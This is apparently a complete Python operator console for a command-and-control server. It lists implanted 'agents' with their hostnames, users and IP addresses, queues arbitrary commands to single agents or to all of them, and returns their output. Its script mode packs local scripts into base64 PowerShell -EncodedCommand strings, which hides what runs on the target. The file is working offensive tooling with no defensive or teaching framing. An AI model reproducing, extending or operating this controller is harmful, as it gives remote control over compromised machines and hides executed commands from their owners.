import sys
import time
import argparse
from typing import Optional
import requests

# Ensure UTF-8 output on Windows consoles
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        pass

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich import print as rprint
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

console = Console(legacy_windows=False) if HAS_RICH else None
DEFAULT_SERVER = "http://127.0.0.1:8000"


def get_client(server_url: str):
    session = requests.Session()
    return session, server_url.rstrip("/")


def cmd_agents(args):
    session, base_url = get_client(args.server)
    try:
        res = session.get(f"{base_url}/api/agents", timeout=5)
        res.raise_for_status()
        agents = res.json()
    except Exception as e:
        print(f"Error connecting to C2 server: {e}")
        sys.exit(1)

    if not agents:
        print("No agents currently registered.")
        return

    if HAS_RICH:
        table = Table(title="Registered C2 Agents")
        table.add_column("Status", justify="center")
        table.add_column("Agent ID", style="bold yellow")
        table.add_column("Hostname")
        table.add_column("User")
        table.add_column("OS / Arch")
        table.add_column("IP Address")
        table.add_column("Last Seen")

        for a in agents:
            status_badge = "[green]ONLINE[/green]" if a.get("is_online") else "[red]OFFLINE[/red]"
            os_info = f"{a.get('os_name', '')} ({a.get('arch', '')})"
            table.add_row(
                status_badge,
                a.get("agent_id", ""),
                a.get("hostname", ""),
                a.get("username", ""),
                os_info,
                a.get("ip_address", ""),
                a.get("last_seen", "")[:19]
            )
        console.print(table)
    else:
        print(f"{'STATUS':<10} {'AGENT ID':<20} {'HOSTNAME':<15} {'IP':<15} {'OS':<15} {'LAST SEEN'}")
        print("-" * 90)
        for a in agents:
            st = "ONLINE" if a.get("is_online") else "OFFLINE"
            print(f"{st:<10} {a.get('agent_id'):<20} {a.get('hostname'):<15} {a.get('ip_address'):<15} {a.get('os_name'):<15} {a.get('last_seen')[:19]}")


def cmd_exec(args):
    session, base_url = get_client(args.server)
    payload = {
        "agent_id": args.agent_id,
        "command": args.command
    }

    try:
        res = session.post(f"{base_url}/api/tasks", json=payload, timeout=5)
        if res.status_code == 404:
            print(f"Error: Agent '{args.agent_id}' does not exist.")
            sys.exit(1)
        res.raise_for_status()
        data = res.json()
    except Exception as e:
        print(f"Error queueing command: {e}")
        sys.exit(1)

    tasks = data.get("tasks", [])
    if not tasks:
        print("No tasks created.")
        return

    first_task = tasks[0]
    task_id = first_task["id"]

    if HAS_RICH:
        rprint(f"[bold green][+][/bold green] Queued task [bold yellow]{task_id}[/bold yellow] for agent [bold cyan]{args.agent_id}[/bold cyan]: [bold white]'{args.command}'[/bold white]")
    else:
        print(f"[+] Queued task {task_id} for agent {args.agent_id}: '{args.command}'")

    if args.wait:
        print("Waiting for agent to check in and execute...")
        start_time = time.time()
        timeout = args.timeout

        while time.time() - start_time < timeout:
            time.sleep(1)
            try:
                t_res = session.get(f"{base_url}/api/tasks/{task_id}", timeout=5)
                t_data = t_res.json()
                status = t_data.get("status")

                if status in ("completed", "failed"):
                    if HAS_RICH:
                        st_color = "green" if status == "completed" else "red"
                        console.print(f"\n[bold {st_color}]Task {status.upper()}[/bold {st_color}] (exit code: {t_data.get('exit_code')})")
                        if t_data.get("stdout"):
                            console.print(Panel(t_data.get("stdout"), title="[cyan]stdout[/cyan]", border_style="green"))
                        if t_data.get("stderr"):
                            console.print(Panel(t_data.get("stderr"), title="[red]stderr[/red]", border_style="red"))
                        if t_data.get("error_message"):
                            console.print(f"[bold red]Error:[/] {t_data.get('error_message')}")
                    else:
                        print(f"\nTask {status.upper()} (Exit code: {t_data.get('exit_code')})")
                        if t_data.get("stdout"):
                            print("--- stdout ---")
                            print(t_data.get("stdout"))
                        if t_data.get("stderr"):
                            print("--- stderr ---")
                            print(t_data.get("stderr"))
                        if t_data.get("error_message"):
                            print(f"--- error: {t_data.get('error_message')} ---")
                    return
                elif status == "dispatched":
                    sys.stdout.write(">")
                    sys.stdout.flush()
                else:
                    sys.stdout.write(".")
                    sys.stdout.flush()
            except Exception as e:
                print(f"\nError polling task: {e}")
                time.sleep(1)

        print(f"\nTimed out waiting for task {task_id} after {timeout} seconds. The task remains queued on the server.")


def cmd_tasks(args):
    session, base_url = get_client(args.server)
    params = {}
    if args.agent:
        params["agent_id"] = args.agent
    if args.status:
        params["status"] = args.status

    try:
        res = session.get(f"{base_url}/api/tasks", params=params, timeout=5)
        res.raise_for_status()
        tasks = res.json()
    except Exception as e:
        print(f"Error fetching tasks: {e}")
        sys.exit(1)

    if not tasks:
        print("No tasks found.")
        return

    if HAS_RICH:
        table = Table(title="[bold cyan]C2 Task Queue[/bold cyan]")
        table.add_column("Task ID", style="bold yellow")
        table.add_column("Agent ID", style="cyan")
        table.add_column("Command")
        table.add_column("Status")
        table.add_column("Exit Code", justify="center")
        table.add_column("Created")
        table.add_column("Completed")

        for t in tasks:
            st = t.get("status", "")
            st_color = "green" if st == "completed" else ("yellow" if st == "pending" else ("blue" if st == "dispatched" else "red"))
            table.add_row(
                t.get("id", "")[:8],
                t.get("agent_id", "")[:12],
                t.get("command", "")[:40],
                f"[{st_color}]{st}[/{st_color}]",
                str(t.get("exit_code") if t.get("exit_code") is not None else "-"),
                t.get("created_at", "")[11:19] if t.get("created_at") else "-",
                t.get("completed_at", "")[11:19] if t.get("completed_at") else "-"
            )
        console.print(table)
    else:
        print(f"{'TASK ID':<10} {'AGENT':<15} {'STATUS':<12} {'EXIT':<6} {'COMMAND'}")
        print("-" * 75)
        for t in tasks:
            exit_code = str(t.get("exit_code")) if t.get("exit_code") is not None else "-"
            print(f"{t.get('id')[:8]:<10} {t.get('agent_id')[:12]:<15} {t.get('status'):<12} {exit_code:<6} {t.get('command')}")


def cmd_output(args):
    session, base_url = get_client(args.server)
    try:
        res = session.get(f"{base_url}/api/tasks/{args.task_id}", timeout=5)
        if res.status_code == 404:
            print(f"Task '{args.task_id}' not found.")
            sys.exit(1)
        res.raise_for_status()
        t = res.json()
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

    if HAS_RICH:
        st_color = "green" if t.get("status") == "completed" else "yellow"
        header = f"[bold]Task:[/] {t.get('id')}\n[bold]Agent:[/] {t.get('agent_id')}\n[bold]Command:[/] {t.get('command')}\n[bold]Status:[/] [{st_color}]{t.get('status')}[/{st_color}] (exit: {t.get('exit_code')})"
        console.print(Panel(header, title="Task Details", border_style="cyan"))
        if t.get("stdout"):
            console.print(Panel(t.get("stdout"), title="Standard Output", border_style="green"))
        if t.get("stderr"):
            console.print(Panel(t.get("stderr"), title="Standard Error", border_style="red"))
        if t.get("error_message"):
            console.print(f"[bold red]Error message:[/] {t.get('error_message')}")
    else:
        print(f"Task ID:   {t.get('id')}")
        print(f"Agent ID:  {t.get('agent_id')}")
        print(f"Command:   {t.get('command')}")
        print(f"Status:    {t.get('status')} (exit code: {t.get('exit_code')})")
        print("\n--- stdout ---")
        print(t.get("stdout") or "(none)")
        if t.get("stderr"):
            print("\n--- stderr ---")
            print(t.get("stderr"))


def cmd_exec_file(args):
    session, base_url = get_client(args.server)
    try:
        with open(args.filepath, "r", encoding="utf-8") as f:
            content = f.read()
    except Exception as e:
        print(f"Error reading file '{args.filepath}': {e}")
        sys.exit(1)

    # If it's a powershell script or requested powershell encoding
    if args.filepath.endswith(".ps1") or args.powershell:
        import base64
        encoded = base64.b64encode(content.encode("utf-16le")).decode("ascii")
        final_cmd = f"powershell.exe -NoProfile -NonInteractive -EncodedCommand {encoded}"
    else:
        # Standard multi-line / script string
        final_cmd = content

    args.command = final_cmd
    cmd_exec(args)


def main():
    parser = argparse.ArgumentParser(description="C2 Operator Command Line Interface")
    parser.add_argument("--server", "-s", default=DEFAULT_SERVER, help="C2 Server URL")
    subparsers = parser.add_subparsers(dest="subcommand", help="Command to run")

    # agents
    p_agents = subparsers.add_parser("agents", help="List all registered agents")

    # exec
    p_exec = subparsers.add_parser("exec", help="Queue command for an agent")
    p_exec.add_argument("agent_id", help="Target agent ID (or 'all')")
    p_exec.add_argument("command", help="Command string to execute")
    p_exec.add_argument("-w", "--wait", action="store_true", help="Wait for task to complete and print output")
    p_exec.add_argument("-t", "--timeout", type=int, default=30, help="Wait timeout in seconds")

    # exec-file / script
    p_file = subparsers.add_parser("exec-file", help="Execute a script file (ps1, bat, sh) on an agent")
    p_file.add_argument("agent_id", help="Target agent ID (or 'all')")
    p_file.add_argument("filepath", help="Path to script file on local machine")
    p_file.add_argument("-ps", "--powershell", action="store_true", help="Force PowerShell UTF-16LE Base64 encoding")
    p_file.add_argument("-w", "--wait", action="store_true", help="Wait for task to complete and print output")
    p_file.add_argument("-t", "--timeout", type=int, default=60, help="Wait timeout in seconds")

    # tasks
    p_tasks = subparsers.add_parser("tasks", help="List tasks")
    p_tasks.add_argument("--agent", "-a", help="Filter by agent ID")
    p_tasks.add_argument("--status", help="Filter by status (pending, dispatched, completed, failed)")

    # output
    p_out = subparsers.add_parser("output", help="Show output of a specific task")
    p_out.add_argument("task_id", help="UUID of task")

    args = parser.parse_args()

    if args.subcommand == "agents":
        cmd_agents(args)
    elif args.subcommand == "exec":
        cmd_exec(args)
    elif args.subcommand == "exec-file":
        cmd_exec_file(args)
    elif args.subcommand == "tasks":
        cmd_tasks(args)
    elif args.subcommand == "output":
        cmd_output(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
